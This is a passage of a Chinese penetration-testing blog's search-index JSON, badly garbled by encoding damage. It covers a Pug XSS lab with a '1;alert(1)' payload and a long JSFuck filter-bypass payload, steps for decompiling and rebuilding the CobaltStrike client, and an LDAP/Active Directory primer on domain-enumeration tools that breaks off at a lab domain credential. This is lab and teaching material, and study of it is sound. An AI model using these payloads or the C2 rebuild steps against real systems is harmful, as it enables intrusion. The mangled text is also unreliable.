","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:4:0","tags":["æ¸—é€æµ‹è¯•","NodeJS"],"title":"NodeJS å®‰å…¨","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"4.1 XSS sudo docker pull registry.cn-shanghai.aliyuncs.com/yhskc/chatsys:latest sudo docker run -d -p 0.0.0.0:32888:80 registry.cn-shanghai.aliyuncs.com/yhskc/chatsys Pug XSS ç»ƒä¹ ä¸€ï¼š é‡‡ç”¨äº†è½¬ä¹‰çš„æ–¹å¼è¿›è¡Œè¾“å‡ºï¼Œå› æ­¤æ— æ³•ç»•è¿‡ ç»ƒä¹ äºŒï¼š é‡‡ç”¨æœªè½¬ä¹‰çš„æ–¹å¼ï¼Œå› æ­¤ç›´æ¥é‡‡ç”¨å¸¸è§„ payload å³å¯ ç»ƒä¹ ä¸‰ï¼š åœ¨ \u003cscript\u003e æ ‡ç­¾ä¸­ï¼Œå› æ­¤ç›´æ¥é‡‡ç”¨è¡Œå†…é—­åˆåæ‹¼æ¥çš„æ–¹å¼å¯ä»¥ XSSï¼Œpayloadï¼š1;alert(1) ç»ƒä¹ å››ï¼š ä»ç„¶æ˜¯æœªè½¬ä¹‰æ¨¡å¼ï¼Œç›´æ¥æ‹¼æ¥å³å¯ ç»ƒä¹ äº”ï¼š å‘ç°å…¶è¿‡æ»¤äº†å°–æ‹¬å·ã€alertã€åˆ†å·ç­‰æ•æ„Ÿå­—ç¬¦ åˆ©ç”¨ JSFuck ç»•è¿‡æ»¤ [][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])() ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:4:1","tags":["æ¸—é€æµ‹è¯•","NodeJS"],"title":"NodeJS å®‰å…¨","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["ä»£ç å®¡è®¡"],"content":"CobaltStrikeäºŒæ¬¡å¼€å‘","date":"2020-12-21","objectID":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/","tags":["ä»£ç å®¡è®¡"],"title":"CobaltStrikeäºŒæ¬¡å¼€å‘","uri":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"},{"categories":["ä»£ç å®¡è®¡"],"content":"CS äºŒæ¬¡å¼€å‘ å·¥å…·ï¼š IDEA è‡ªå¸¦çš„ java-decompiler.jar ","date":"2020-12-21","objectID":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/:0:0","tags":["ä»£ç å®¡è®¡"],"title":"CobaltStrikeäºŒæ¬¡å¼€å‘","uri":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1 CS åç¼–è¯‘ ä»¥ MAC ä¸ºä¾‹ï¼ŒIDEA è‡ªå¸¦çš„ java-decompiler.jar åœ°å€ä¸ºï¼š /Applications/IntelliJ IDEA.app/Contents/plugins/java-decompiler/lib/java-decompiler.jar å› ä¸º MANIFEST.MF ä¸­æ²¡æœ‰ main class å±æ€§ï¼Œæ²¡æœ‰æŒ‡å®šä¸»ç±»ï¼Œå› æ­¤ä¸èƒ½ç›´æ¥ä½¿ç”¨ java -jarï¼Œå¦‚æœæƒ³è¦æ‰§è¡Œ java åŒ…ä¸­å…·ä½“çš„ç±»ï¼Œè¦ä½¿ç”¨ java -cp è¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š ä½¿ç”¨æ–¹æ³•ï¼š java -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true cs_bin/cobaltstrike.jar cs_src åç¼–è¯‘åï¼Œä¼šè‡ªåŠ¨æ‰“åŒ…æˆ jar åŒ…ï¼Œå³é”®è§£å‹åæ‰“å¼€å¯ä»¥çœ‹åˆ°éƒ½æ˜¯ .java äº†ï¼Œä½¿ç”¨è¿™ä¸ªæ–¹æ³•ä¼šéå¸¸æ–¹ä¾¿ï¼Œå°±ä¸éœ€è¦ç¬¬ä¸‰æ–¹å·¥å…·,è¿™ä¸ªåç¼–è¯‘å‡ºæ¥çš„å°±å¯ä»¥ç›´æ¥æ”¾å…¥ IntelliJ IDEA ä¸­ï¼Œå¯ç›´æ¥å®ç°ä»£ç æœç´¢ï¼Œç›¸å…³çš„äº¤å‰å¼•ç”¨ã€‚ ","date":"2020-12-21","objectID":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/:1:0","tags":["ä»£ç å®¡è®¡"],"title":"CobaltStrikeäºŒæ¬¡å¼€å‘","uri":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2 CS äºŒæ¬¡å¼€å‘å‡†å¤‡å·¥ä½œ ","date":"2020-12-21","objectID":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/:2:0","tags":["ä»£ç å®¡è®¡"],"title":"CobaltStrikeäºŒæ¬¡å¼€å‘","uri":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2.1 åˆ›å»ºå·¥ç¨‹ æ‰“å¼€ IntelliJ IDEA é€‰æ‹© Create New Project ä¸€ç›´é€‰æ‹© Nextã€‚ åˆ›å»ºå·¥ç¨‹ç›®å½•ï¼š åˆ›å»ºå¥½åéœ€è¦å…ˆå»ºç«‹ä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼Œå³å‡»é€‰æ‹© New Directory å»ºç«‹ä¸€ä¸ª decompiled_src æ–‡ä»¶å¤¹ï¼Œä¹‹åå†å»ºç«‹ä¸€ä¸ª lib æ–‡ä»¶å¤¹ã€‚ ","date":"2020-12-21","objectID":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/:2:1","tags":["ä»£ç å®¡è®¡"],"title":"CobaltStrikeäºŒæ¬¡å¼€å‘","uri":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2.2 é…ç½®ä¾èµ–å…³ç³» æŠŠåˆšåˆšåç¼–è¯‘å¥½çš„ CobaltStrike å¤åˆ¶åˆ° decompiled_src ä¸­ï¼Œç„¶åæŠŠå®ƒè§£å‹å‡ºæ¥ï¼Œå¯çœ‹åˆ°ä¸€ä¸ªå®Œæ•´çš„åç¼–è¯‘åçš„ç›®å½•ã€‚ éšåæŠŠåŸå§‹çš„æœªç¼–è¯‘çš„ CobaltStrike æ”¾åˆ°åˆšåˆšæ–°å»ºçš„ lib ä¸­å»ã€‚ æ¥ä¸‹æ¥éœ€è¦å¯¹è¿™ä¸ªé¡¹ç›®è¿›è¡Œè®¾ç½®ï¼Œç‚¹å‡» File ä¸­çš„ Project Structure åœ¨ Modules å¯¹ Dependencies è¿›è¡Œè®¾ç½®ã€‚ ç‚¹å‡»æ·»åŠ  Jar or Directoriesï¼Œæ·»åŠ  ./lib ä¸‹çš„åŸå§‹ JAR åŒ…ï¼Œå¹¶å‹¾é€‰ Exportï¼š ","date":"2020-12-21","objectID":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/:2:2","tags":["ä»£ç å®¡è®¡"],"title":"CobaltStrikeäºŒæ¬¡å¼€å‘","uri":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2.3 å¯»æ‰¾ Main Class ç‚¹å‡» ./lib/META_INF/MANIFEST.MF ï¼Œå¤åˆ¶ Main-Classï¼š å°†åŸå§‹åŒ…ä¸­ MANIFEST.MF çš„å†…å®¹å¤åˆ¶åˆ°é¡¹ç›®ä¸­çš„ MANIFEST.MF ","date":"2020-12-21","objectID":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/:2:3","tags":["ä»£ç å®¡è®¡"],"title":"CobaltStrikeäºŒæ¬¡å¼€å‘","uri":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2.4 é…ç½® Artifacts æ¥ä¸‹æ¥åœ¨ decompiled_src ç›®å½•ä¸­æ‰¾åˆ°å·²ç»åç¼–è¯‘å®Œçš„ aggressor ä¸»ç±»ï¼Œå³å‡»é€‰æ‹© Refactor â€”â€”Copy File åˆ° src ä¸‹çš„ç›¸åŒç›®å½•ï¼š ","date":"2020-12-21","objectID":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/:2:4","tags":["ä»£ç å®¡è®¡"],"title":"CobaltStrikeäºŒæ¬¡å¼€å‘","uri":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2.5 ä¿®æ”¹åç¼–è¯‘ ç‚¹å‡» Build -\u003e Build Artifacts -\u003e build ","date":"2020-12-21","objectID":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/:2:5","tags":["ä»£ç å®¡è®¡"],"title":"CobaltStrikeäºŒæ¬¡å¼€å‘","uri":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3 IDEA å…¶å®ƒ Tips ","date":"2020-12-21","objectID":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/:3:0","tags":["ä»£ç å®¡è®¡"],"title":"CobaltStrikeäºŒæ¬¡å¼€å‘","uri":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3.1 æ¯”å¯¹ JAR åŒ… åœ¨è¿›è¡Œ bin æ–‡ä»¶å¯¹æ¯”æ—¶ï¼Œè‡ªåŠ¨è¿›è¡Œåç¼–è¯‘ å‘½ä»¤è¡Œå½¢å¼ï¼š windows: /path/to/idea/bin/idea64.exe diff absolute/path/to/file1 absolute/path/to/file2 mac: /Applications/IntelliJ IDEA.app/Contents/MacOS/idea absolute/path/to/file1 absolute/path/to/file2 åœ¨ IDEA ä¸­ï¼š é€‰ä¸­è¦æ¯”å¯¹çš„ä¸¤ä¸ªæ–‡ä»¶ï¼ŒCommand + D è¿›è¡Œæ¯”å¯¹ ","date":"2020-12-21","objectID":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/:3:1","tags":["ä»£ç å®¡è®¡"],"title":"CobaltStrikeäºŒæ¬¡å¼€å‘","uri":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"},{"categories":["åè®®"],"content":"LDAP åè®®ç›¸å…³çŸ¥è¯†ä»‹ç»","date":"2020-12-14","objectID":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/","tags":["LDAP","åè®®"],"title":"LDAP åè®®ç›¸å…³","uri":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/"},{"categories":["åè®®"],"content":"1 ç›®å½•æœåŠ¡ç®€ä»‹ æ—¥å¸¸ç”Ÿæ´»ä¸­ä½¿ç”¨çš„ç”µè¯è–„å†…è®°å½•ç€äº²æœ‹å¥½å‹çš„å§“åã€ç”µè¯ä¸åœ°å€ç­‰æ•°æ®ï¼Œå®ƒå°±æ˜¯ telephone directory(ç”µè¯ç›®å½•)ï¼›è®¡ç®—æœºä¸­çš„æ–‡ä»¶ç³»ç»Ÿ(file system)å†…è®°å½•ç€æ–‡ä»¶çš„æ–‡ä»¶åã€å¤§å°ä¸æ—¥æœŸç­‰æ•°æ®ï¼Œå®ƒå°±æ˜¯ file directory(æ–‡ä»¶ç›®å½•)ã€‚ å¦‚æœè¿™äº›ç›®å½•å†…çš„æ•°æ®èƒ½å¤Ÿç”±ç³»ç»ŸåŠ ä»¥æ•´ç†ï¼Œç”¨æˆ·å°±èƒ½å¤Ÿå®¹æ˜“ä¸”è¿…é€Ÿåœ°æŸ¥æ‰¾åˆ°æ‰€éœ€çš„æ•°æ®ï¼Œè€Œ directory service(ç›®å½•æœåŠ¡)æä¾›çš„æœåŠ¡ï¼Œå°±æ˜¯è¦è¾¾åˆ°æ­¤ç›®çš„ã€‚ ç›®å½•æœåŠ¡æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„éå…³ç³»å‹æ•°æ®åº“ï¼Œç”¨æ¥ä¿å­˜æè¿°æ€§çš„ã€åŸºäºå±æ€§çš„è¯¦ç»†ä¿¡æ¯ï¼Œæ”¯æŒè¿‡æ»¤åŠŸèƒ½ã€‚ è¿™ç§æ•°æ®åº“ä¸æˆ‘ä»¬å¸¸â»…çš„å…³ç³»å‹æ•°æ®åº“(Mysqlã€SQL Serverã€Oracleç­‰)çš„åŒºåˆ«åœ¨äºç›®å½•æœåŠ¡ä»¥æ ‘çŠ¶çš„å±‚æ¬¡ç»“æ„æ¥å­˜å‚¨æ•°æ®ï¼Œå°±å¥½åƒ Linux/Unix ç³»ç»Ÿä¸­çš„æ–‡ä»¶ç›®å½•ä¸€æ ·ã€‚æ­¤å¤–ï¼Œç›®å½•æœåŠ¡æ˜¯ä¸€ä¸ªä¸“â»”ä¸ºæœç´¢å’Œæµè§ˆè€Œä¼˜åŒ–çš„æ•°æ®åº“ï¼Œæœ‰ç€ä¼˜å¼‚çš„è¯»æ€§èƒ½ï¼Œä½†å†™æ€§èƒ½å·®ï¼Œå¹¶ä¸”æ²¡æœ‰äº‹åŠ¡å¤„ç†ã€å›æ»šç­‰å¤æ‚åŠŸèƒ½ï¼Œä¸é€‚äºå­˜å‚¨ä¿®æ”¹é¢‘ç¹çš„æ•°æ®ã€‚ ç»¼ä¸Šæ‰€è¿°ï¼Œç›®å½•æœåŠ¡æ›´é€‚ç”¨äºå­˜å‚¨å¦‚ç»„ç»‡æ¶æ„ä¹‹ç±»çš„ä¿¡æ¯ã€‚ ","date":"2020-12-14","objectID":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/:1:0","tags":["LDAP","åè®®"],"title":"LDAP åè®®ç›¸å…³","uri":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/"},{"categories":["åè®®"],"content":"2 LDAP ç®€ä»‹ LDAP(Light Directory Access Portocol)æ˜¯åŸºäº X.500 æ ‡å‡†çš„è½»é‡çº§ç›®å½•è®¿é—®åè®®ã€‚LDAP åè®®ä¹‹å‰æœ‰ä¸€ä¸ª X.500 DAP åè®®è§„èŒƒï¼Œè¯¥åè®®ååˆ†å¤æ‚ï¼Œæ˜¯ä¸€ä¸ªé‡é‡çº§çš„åè®®ï¼Œåæ¥å¯¹ X.500 è¿›è¡Œäº†ç®€åŒ–ï¼Œè¯ç”Ÿäº† LDAP åè®®ï¼Œä¸ X.500 ç›¸æ¯”å˜å¾—è¾ƒä¸ºè½»é‡ï¼Œå…¶å® LDAP åè®®ä¾ç„¶å¤æ‚ã€‚ LDAP çº¦å®šäº† Client ä¸ Server ä¹‹é—´çš„ä¿¡æ¯äº¤äº’æ ¼å¼ã€ä½¿ç”¨çš„ç«¯å£å·ã€è®¤è¯æ–¹å¼ç­‰å†…å®¹ã€‚è€Œ LDAP åè®®çš„å®ç°ï¼Œæœ‰ç€ä¼—å¤šç‰ˆæœ¬ï¼Œä¾‹å¦‚å¾®è½¯çš„ Active Directory æ˜¯ LDAP åœ¨ Windows ä¸Šçš„å®ç°ï¼ŒAD å®ç°äº† LDAP æ‰€éœ€çš„æ ‘å½¢æ•°æ®åº“ã€å…·ä½“å¦‚ä½•è§£æè¯·æ±‚æ•°æ®å¹¶åˆ°æ•°æ®åº“æŸ¥è¯¢ç„¶åè¿”å›ç»“æœç­‰åŠŸèƒ½ã€‚å†ä¾‹å¦‚ OpenLDAP æ˜¯å¯ä»¥è¿è¡Œåœ¨ Linux ä¸Šçš„ LDAP åè®®çš„å¼€æºå®ç°ã€‚è€Œæˆ‘ä»¬å¹³å¸¸è¯´çš„ LDAP Serverï¼Œä¸€èˆ¬æŒ‡çš„æ˜¯å®‰è£…å¹¶é…ç½®äº† Active Directoryã€OpenLDAP è¿™äº›ç¨‹åºçš„æœåŠ¡å™¨ã€‚ ","date":"2020-12-14","objectID":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/:2:0","tags":["LDAP","åè®®"],"title":"LDAP åè®®ç›¸å…³","uri":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/"},{"categories":["åè®®"],"content":"3 LDAP çš„åŸºæœ¬æ¨¡å‹ æ¯ä¸€ä¸ªç³»ç»Ÿã€åè®®éƒ½ä¼šæœ‰å±äºè‡ªå·±çš„æ¨¡å‹ï¼ŒLDAP ä¹Ÿä¸ä¾‹å¤–ï¼Œåœ¨äº†è§£ LDAP çš„åŸºæœ¬æ¨¡å‹ä¹‹å‰æˆ‘ä»¬éœ€è¦å…ˆäº†è§£å‡ ä¸ª LDAP çš„ç›®å½•æ ‘æ¦‚å¿µ: ç›®å½•æ ‘ï¼šåœ¨ä¸€ä¸ªç›®å½•æœåŠ¡ç³»ç»Ÿä¸­ï¼Œæ•´ä¸ªç›®å½•ä¿¡æ¯é›†å¯ä»¥è¡¨ç¤ºä¸ºä¸€ä¸ªç›®å½•ä¿¡æ¯æ ‘ï¼Œæ ‘ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹æ˜¯ ä¸€ä¸ªæ¡ç›®ã€‚ æ¡ç›®ï¼šæ¯ä¸ªæ¡ç›®å°±æ˜¯ä¸€æ¡è®°å½•ï¼Œæ¯ä¸ªæ¡ç›®æœ‰è‡ªå·±çš„å”¯ä¸€å¯åŒºåˆ«çš„åç§°(DN)ã€‚ å¯¹è±¡ç±»ï¼šobjectClassï¼Œä¸æŸä¸ªå®ä½“ç±»å‹å¯¹åº”çš„ä¸€ç»„å±æ€§ï¼Œå¯¹è±¡ç±»æ˜¯å¯ä»¥ç»§æ‰¿çš„ï¼Œè¿™æ ·çˆ¶ç±»çš„å¿…é¡»å± æ€§ä¹Ÿä¼šè¢«ç»§æ‰¿ä¸‹æ¥ã€‚ å±æ€§ï¼šæè¿°æ¡ç›®çš„æŸä¸ªæ–¹é¢çš„ä¿¡æ¯ï¼Œä¸€ä¸ªå±æ€§ç”±ä¸€ä¸ªå±æ€§ç±»å‹å’Œä¸€ä¸ªæˆ–å¤šä¸ªå±æ€§å€¼ç»„æˆï¼Œå±æ€§æœ‰å¿…é¡»å±æ€§å’Œéå¿…é¡»å±æ€§ã€‚ LDAP ç›®å½•ä»¥æ ‘çŠ¶çš„å±‚æ¬¡ç»“æ„æ¥å­˜å‚¨æ•°æ®ï¼Œæœ€é¡¶å±‚å³æ ¹éƒ¨ç§°ä½œã€ŒåŸºå‡†DNã€ï¼Œå½¢å¦‚ dc=geekby,dc=xyz æˆ–è€… ou=geekby.xyzï¼Œå‰ä¸€ç§æ–¹å¼æ›´ä¸ºçµæ´»ä¹Ÿæ˜¯ Windows AD ä¸­ä½¿ç”¨çš„æ–¹å¼ã€‚åœ¨æ ¹ç›®å½•çš„ä¸‹é¢æœ‰å¾ˆå¤šçš„æ–‡ä»¶å’Œç›®å½•ï¼Œä¸ºäº†æŠŠè¿™äº›å¤§é‡çš„æ•°æ®ä»é€»è¾‘ä¸Šåˆ†å¼€ï¼ŒLDAP åƒå…¶å®ƒçš„ç›®å½•æœåŠ¡åè®®ä¸€æ ·ä½¿ç”¨ OU(Organization Unit)ï¼Œå¯ä»¥ç”¨æ¥è¡¨ç¤ºå…¬å¸å†…éƒ¨æœºæ„ï¼Œå¦‚éƒ¨â»”ç­‰ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥è¡¨ç¤ºè®¾å¤‡ã€äººå‘˜ç­‰ã€‚åŒæ—¶ OU è¿˜å¯ä»¥æœ‰å­ OUï¼Œç”¨æ¥è¡¨ç¤ºæ›´ä¸ºç»†è‡´çš„åˆ†ç±»ã€‚LDAP ä¸­æ¯ä¸€æ¡è®°å½•éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„åŒºåˆ«äºå…¶å®ƒè®°å½•çš„åå­— DN(Distinguished Name)ï¼Œå…¶å¤„åœ¨ã€Œå¶å­ã€ä½ç½®çš„éƒ¨åˆ†ç§°ä½œ RDNï¼›å¦‚ dn:cn=tom,ou=animals,dc=geekby,dc=xyz ä¸­ tom å³ä¸º RDNï¼›RDN åœ¨ä¸€ä¸ª OU ä¸­å¿…é¡»æ˜¯å”¯ä¸€çš„ã€‚ å› ä¸º LDAP æ•°æ®æ˜¯ã€Œæ ‘ã€çŠ¶çš„ï¼Œè€Œä¸”è¿™æ£µæ ‘æ˜¯å¯ä»¥æ— é™å»¶ä¼¸çš„ï¼Œå‡è®¾ä½ è¦æ ‘ä¸Šçš„ä¸€æ¡è®°å½•ï¼Œå¦‚ä½•å¯»æ‰¾å®ƒçš„ä½ç½®å‘¢ï¼Ÿå½“ç„¶é¦–å…ˆè¦è¯´æ˜æ˜¯å“ªä¸€æ£µæ ‘(dc)ï¼Œç„¶åæ˜¯ä»æ ‘æ ¹åˆ°é‚£ä¸ªè‹¹æœæ‰€ç»è¿‡çš„æ‰€æœ‰ã€Œåˆ†å‰ã€(ou)ï¼Œæœ€åå°±æ˜¯è¿™ä¸ªè‹¹æœçš„åå­—(cn)ã€‚çŸ¥é“äº†æ ‘(dc=geekby,dc=xyz)ï¼Œåˆ†å‰ (ou=IT,ou=Worker,ou=Pentester)ï¼Œè‹¹æœ(cn=abc)ï¼Œå°±å¯ä»¥æ‰¾åˆ°æˆ‘ä»¬æƒ³è¦çš„è‹¹æœäº†ï¼š dn:cn=abc,ou=IT,ou=Worker,ou=Pentester,dc=geekby,dc=xyz LDAP çš„åŠŸèƒ½æ¨¡å‹ä¸­å®šä¹‰äº†ä¸€ç³»åˆ—åˆ©ç”¨ LDAP åè®®çš„æ“ä½œã€‚å®ƒåŒ…å«äº†ä¸‰ä¸ªéƒ¨åˆ†: æŸ¥è¯¢æ“ä½œ(Interrogation Operations)ï¼šå®¹è®¸æŸ¥è¯¢ç›®å½•å’Œå–å¾—æ•°æ®ã€‚å®ƒåŒ…å« Search Operating å’Œ Compare Operationã€‚ æ›´æ–°æ“ä½œ(Update Operations)ï¼šå®¹è®¸æ·»åŠ (ADD)ã€åˆ é™¤(Delete)ã€é‡å‘½å(Rename)å’Œæ”¹å˜ç›®å½•(Modify) è®¤è¯å’Œç®¡ç†æ“ä½œ(Authentication And Control Operations)å®¹è®¸å®¢æˆ·ç«¯åœ¨ç›®å½•ä¸­è¯†åˆ«è‡ªå·±ï¼Œå¹¶ä¸”èƒ½å¤Ÿæ§åˆ¶ä¸€ä¸ª Session çš„æ€§è´¨ã€‚ ","date":"2020-12-14","objectID":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/:3:0","tags":["LDAP","åè®®"],"title":"LDAP åè®®ç›¸å…³","uri":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/"},{"categories":["åè®®"],"content":"4 LDAP å’Œ AD çš„å…³ç³» Active Directory æ˜¯å¾®è½¯åŸºäº LDAP åè®®çš„ä¸€å¥—è§£å†³æ–¹æ¡ˆ(LDAP æœåŠ¡å™¨ + åº”ç”¨)ï¼Œ è€Œ LDAP æ˜¯ä¸ AD äº¤äº’çš„åè®®ä¹‹ä¸€ã€‚ Active Directory è§£å†³äº†ç»†ç²’åº¦çš„æƒé™æ§åˆ¶ã€Œè°ã€ä»¥ ã€Œä»€ä¹ˆæƒé™ã€è®¿é—®ã€Œä»€ä¹ˆã€ã€‚AD åœ¨ LDAP v3 è§„èŒƒä¹‹ä¸Šè¿˜æœ‰è‡ªå®šä¹‰æ‰©å±•ï¼Œä¾‹å¦‚ï¼Œå¸æˆ·é”å®šï¼Œå¯†ç åˆ°æœŸç­‰ã€‚ ","date":"2020-12-14","objectID":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/:4:0","tags":["LDAP","åè®®"],"title":"LDAP åè®®ç›¸å…³","uri":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/"},{"categories":["åè®®"],"content":"5 åˆ©ç”¨ LDAP æ”¶é›†åŸŸä¿¡æ¯ é€šå¸¸æƒ…å†µä¸‹ï¼Œä»»ä½•ä¸€åè®¤è¯ç”¨æˆ·éƒ½å¯ä»¥é€šè¿‡ LDAP æ¥è·å–å¤§é‡æœ‰è¶£çš„åŸŸä¿¡æ¯ã€‚å› æ­¤ï¼Œåœ¨ä¿¡æ¯æ”¶é›†é˜¶æ®µï¼Œå¯ä»¥åˆ©ç”¨ LDAP æŸ¥è¯¢ã€æ•´ç†åŸŸç¯å¢ƒçš„ç›¸å…³ä¿¡æ¯ã€‚ ","date":"2020-12-14","objectID":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/:5:0","tags":["LDAP","åè®®"],"title":"LDAP åè®®ç›¸å…³","uri":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/"},{"categories":["åè®®"],"content":"5.1 ç›¸å…³å·¥å…· adfind å¯ä»¥åœ¨å‘½ä»¤ä¸‹è·å–åŸŸçš„è¯¦ç»†ä¿¡æ¯ï¼Œç”¨æ³•å‚è€ƒï¼šhttp://www.joeware.net/freetools/tools/adfind/usage.htm ADExplorer æ˜¯ç‹¬ç«‹çš„å¯æ‰§è¡Œè½¯ä»¶ï¼Œæ— éœ€å®‰è£…ã€‚ é™¤äº†æŸ¥è¯¢åŸŸä¿¡æ¯å¤–ï¼ŒADExplorer è¿˜å¯ä»¥æ‹æ‘„å¿«ç…§ï¼Œå¯ä»¥å¿«ç…§ä¿å­˜åœ¨æœ¬åœ°ï¼Œå¹¶å¯ä»¥ä½¿ç”¨ ADExplorer æ‰“å¼€è¿›è¡Œæ“ä½œã€‚ ldapsearch LDAPDomainDump ä¸º python å¼€å‘ï¼Œå¯ä»¥é€šè¿‡ LDAP æ”¶é›†å’Œè§£ææ•°æ®ï¼Œå¹¶å°†å…¶è¾“å‡ºä¸ºäººç±»å¯è¯»çš„ HTML æ ¼å¼ä»¥åŠæœºå™¨å¯è¯»çš„ JSON å’Œ CSV/TSV æ ¼å¼ã€‚ domain_groups: ç›®æ ‡åŸŸçš„ç»„åˆ—è¡¨ domain_users: ç›®æ ‡åŸŸçš„ç”¨æˆ·åˆ—è¡¨ domain_computers: ç›®æ ‡åŸŸçš„è®¡ç®—æœºè´¦å·åˆ—è¡¨ domain_policy: åŸŸç­–ç•¥ï¼Œä¾‹å¦‚æ˜¯å¦éœ€è¦å¯†ç ç­‰ domain_trusts: ä¼ å…¥å’Œä¼ å‡ºåŸŸå±æ€§ä»¥åŠæ˜¯å¦å—ä¿¡ä»» ","date":"2020-12-14","objectID":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/:5:1","tags":["LDAP","åè®®"],"title":"LDAP åè®®ç›¸å…³","uri":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/"},{"categories":["åè®®"],"content":"5.2 è·å–åŸŸä¿¡æ¯å®ä¾‹ ç¯å¢ƒï¼š åŸŸæ§:192.168.66.26 (dc.company.com) åŸŸç”¨æˆ·å‡­è¯ï¼špentest\\win7user:123456aB ä½¿ç”¨å·¥å…· Adfind.exe ä¸‹é¢åˆ—å‡ºäº† Adfind 